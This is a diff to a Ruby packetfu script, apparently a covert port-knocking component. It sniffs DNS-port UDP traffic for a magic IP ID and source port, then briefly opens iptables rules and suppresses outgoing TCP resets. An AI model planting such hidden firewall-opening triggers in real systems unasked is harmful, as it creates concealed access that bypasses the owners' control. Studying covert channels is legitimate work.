@@ -1,4 +1,3 @@
-#!/usr/bin/ruby
 require 'rubygems'
 require 'packetfu'
 
@@ -11,11 +10,10 @@ class Knock
   end
 
   def sniff
-
     @cap = Capture.new(:iface => @iface, :start => true, :promisc => true, :filter => "udp and port 53")
     @cap.stream.each do |p|
       pkt = Packet.parse p
-      if pkt.is_udp?
+      if pkt.is_udp? && pkt.ip_header.ip_id == 32452
         a = pkt.ip_saddr.split(".")
         if a[2].to_i == 239 && pkt.udp_sport == 21423
           puts "Success"
@@ -38,6 +36,10 @@ class Knock
             system("iptables -I INPUT -p " + @tos + " --sport " + sport.to_s + " -j ACCEPT")
             t = Thread.new {sleep(100); system("iptables -D INPUT -p " + @tos + " --sport " + sport.to_s + " -j ACCEPT") }
           end
+          if @tos == "tcp"
+          system("iptables -I OUTPUT -p tcp --sport " + sport.to_s + " --tcp-flags RST RST -j DROP")
+          t = Thread.new {sleep(100); system("iptables -D OUTPUT -p tcp --sport " + sport.to_s + " --tcp-flags RST RST -j DROP") }
+          end
           return sport
         end
       end
@@ -46,20 +48,21 @@ class Knock
 
   def knock(destIp, tos)
     c = 239
-    case tos
+    @tos = tos
+    case @tos
       when "icmp"
-        b = rand(1..80)
+        b = rand(80) + 1 #range 1 - 80
       when "tcp"
-        b = rand(81..161)
+        b = rand(80) + 81 #rand 81 - 161
       when "udp"
-        b = rand(162..254)
+        b = rand(93) + 162 #rand 162 - 254
       else
-        puts tos
+        puts @tos
         abort "Knock::knock invalid tos"
     end
     while(true)
-      a = rand(1..254)
-      d = rand(1..254)
+      a = rand(254) + 1
+      d = rand(254) + 1
       e = a * d
       if e > 10000
         break
